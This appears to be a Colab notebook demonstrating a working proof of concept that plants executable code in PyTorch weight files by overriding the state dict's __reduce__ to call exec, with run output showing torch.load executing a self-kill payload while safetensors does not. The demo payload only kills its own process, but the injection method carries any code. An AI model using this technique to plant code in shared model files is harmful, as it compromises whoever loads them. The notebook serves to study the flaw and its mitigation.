{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO+Do5Y+eE11bRQqoi28VHw",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Erickrus/llm/blob/main/torch_weights_hacking.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "#Torch Weights Hacking\n",
        "\n",
        "Torch native save() method is vulnerable and can be used for malicious code injection.\n",
        "\n",
        "Following codes demostrate how the code is injected into pytorch weights. The codes are based on hack.py.\n",
        "\n",
        "https://github.com/FrankLeeeee/Blog-Notes/blob/main/2024-10-19-safetensor/hack.py\n",
        "\n",
        "This code is only for study purpose. Do not abuse the code."
      ],
      "metadata": {
        "id": "Z7D7M2MrklTf"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title installation\n",
        "!pip3 install -q safetensors"
      ],
      "metadata": {
        "cellView": "form",
        "id": "kIAzEKLvhCg0"
      },
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "id": "vH8DOqN0gL-Z",
        "outputId": "84b17658-4284-4031-c963-350a17a53aa5"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Writing /content/weights_hacking.py\n"
          ]
        }
      ],
      "source": [
        "#@title weights_hacking.py\n",
        "%%writefile /content/weights_hacking.py\n",
        "import argparse\n",
        "import torch\n",
        "import time\n",
        "from torchvision.models import resnet50\n",
        "import torch.distributed as dist\n",
        "import torch.multiprocessing as mp\n",
        "import os\n",
        "from safetensors.torch import save_file, safe_open\n",
        "\n",
        "\n",
        "AUTO_KILL = \"\"\"\n",
        "import os\n",
        "import threading\n",
        "from functools import partial\n",
        "\n",
        "pid = os.getpid()\n",
        "\n",
        "def inject_code(pid: int):\n",
        "    print(f\">>> inject_code({pid})\")\n",
        "    import time\n",
        "    import os\n",
        "    print(\">>> time.sleep(5)\")\n",
        "    time.sleep(5)\n",
        "    print(f\">>> os.kill({pid}, 9)\")\n",
        "    os.kill(pid, 9)\n",
        "\n",
        "wrapped_fn = partial(inject_code, pid)\n",
        "injection_thread = threading.Thread(target=wrapped_fn)\n",
        "injection_thread.start()\n",
        "\"\"\"\n",
        "\n",
        "\n",
        "def inject_malicious_code(obj, code_str):\n",
        "    # bind a reduce fn to weights\n",
        "    def reduce(self):\n",
        "        return (exec, (code_str, ))\n",
        "\n",
        "    # bind the reduce fn to the weights's __reduce__ method\n",
        "    bound_reduce = reduce.__get__(obj, obj.__class__)\n",
        "    setattr(obj, \"__reduce__\", bound_reduce)\n",
        "    return obj\n",
        "\n",
        "\n",
        "def parse_args():\n",
        "    parser = argparse.ArgumentParser()\n",
        "    parser.add_argument(\"--hack\", type=str, choices=[\"auto_kill\"])\n",
        "    parser.add_argument(\"--use-safetensor\", default=False, action=\"store_true\")\n",
        "    return parser.parse_args()\n",
        "\n",
        "\n",
        "def save_and_load_model(malicious_code_str, weights_name, use_safetensor=False):\n",
        "    print(\">>> model = resnet50()\")\n",
        "    model = resnet50()\n",
        "    state_dict = model.state_dict()\n",
        "    print(\">>> inject_malicious_code(state_dict, malicious_code_str)\")\n",
        "    inject_malicious_code(state_dict, malicious_code_str)\n",
        "\n",
        "    if not use_safetensor:\n",
        "        print(\"not use_safetensor\")\n",
        "        print(\">>> torch.save(state_dict, weights_name)\")\n",
        "        torch.save(state_dict, weights_name)\n",
        "        print(\">>> torch.load(weights_name)\")\n",
        "        torch.load(weights_name)\n",
        "    else:\n",
        "        print(\"use_safetensor\")\n",
        "        weights_name = weights_name.replace(\".bin\", \".safetensors\")\n",
        "        print(\">>> save_file(state_dict, weights_name)\")\n",
        "        save_file(state_dict, weights_name)\n",
        "        print('>>> safe_open(weights_name, framework=\"pt\")')\n",
        "        safe_open(weights_name, framework=\"pt\")\n",
        "\n",
        "\n",
        "def main():\n",
        "    args = parse_args()\n",
        "\n",
        "    if args.hack == \"auto_kill\":\n",
        "        save_and_load_model(AUTO_KILL, \"hacked_weights.bin\", args.use_safetensor)\n",
        "\n",
        "        if args.use_safetensor:\n",
        "            print(\"You program will keep running forever, please kill it manually\")\n",
        "        else:\n",
        "            print(\"You program will be killed after 5 seconds\")\n",
        "        i = 0\n",
        "        while True:\n",
        "            # keep it running\n",
        "            time.sleep(1)\n",
        "            print(\"still running\")\n",
        "    else:\n",
        "        raise ValueError(f\"Unknown hack: {args.hack}\")\n",
        "\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title weights injection using torch native save\n",
        "!python3 weights_hacking.py \\\n",
        "  --hack auto_kill"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "id": "121zoAFzixSW",
        "outputId": "9b03ca99-3bcd-4d4b-be5b-90a7f4759cfd"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            ">>> model = resnet50()\n",
            ">>> inject_malicious_code(state_dict, malicious_code_str)\n",
            "not use_safetensor\n",
            ">>> torch.save(state_dict, weights_name)\n",
            ">>> torch.load(weights_name)\n",
            "/content/weights_hacking.py:63: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.\n",
            "  torch.load(weights_name)\n",
            ">>> inject_code(298)\n",
            "You program will be killed after 5 seconds\n",
            ">>> time.sleep(5)\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            ">>> os.kill(298, 9)\n",
            "^C\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title weights injection using safetensors\n",
        "!python3 weights_hacking.py \\\n",
        "  --hack auto_kill \\\n",
        "  --use-safetensor"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "id": "u_X-nUBWhWh5",
        "outputId": "c6dbf38c-1c7d-4e89-a7c6-3d2a8671117e"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            ">>> model = resnet50()\n",
            ">>> inject_malicious_code(state_dict, malicious_code_str)\n",
            "use_safetensor\n",
            ">>> save_file(state_dict, weights_name)\n",
            ">>> safe_open(weights_name, framework=\"pt\")\n",
            "You program will keep running forever, please kill it manually\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "still running\n",
            "Traceback (most recent call last):\n",
            "  File \"/content/weights_hacking.py\", line 93, in <module>\n",
            "    main()\n",
            "  File \"/content/weights_hacking.py\", line 86, in main\n",
            "    time.sleep(1)\n",
            "KeyboardInterrupt\n",
            "Exception ignored in atexit callback: <function dump_compile_times at 0x7e3d68db8430>\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/torch/_dynamo/utils.py\", line 335, in dump_compile_times\n",
            "    log.info(compile_times(repr=\"str\", aggregate=True))\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/torch/_dynamo/utils.py\", line 322, in compile_times\n",
            "    out += tabulate(rows, headers=(\"Function\", \"Runtimes (s)\"))\n",
            "  File \"/usr/local/lib/python3.10/dist-packages/torch/_dynamo/utils.py\", line 127, in tabulate\n",
            "    import tabulate\n",
            "  File \"<frozen importlib._bootstrap>\", line 1027, in _find_and_load\n",
            "  File \"<frozen importlib._bootstrap>\", line 1006, in _find_and_load_unlocked\n",
            "  File \"<frozen importlib._bootstrap>\", line 688, in _load_unlocked\n",
            "  File \"<frozen importlib._bootstrap_external>\", line 879, in exec_module\n",
            "  File \"<frozen importlib._bootstrap_external>\", line 1016, in get_code\n",
            "  File \"<frozen importlib._bootstrap_external>\", line 1074, in get_data\n",
            "KeyboardInterrupt: \n",
            "^C\n"
          ]
        }
      ]
    }
  ]
}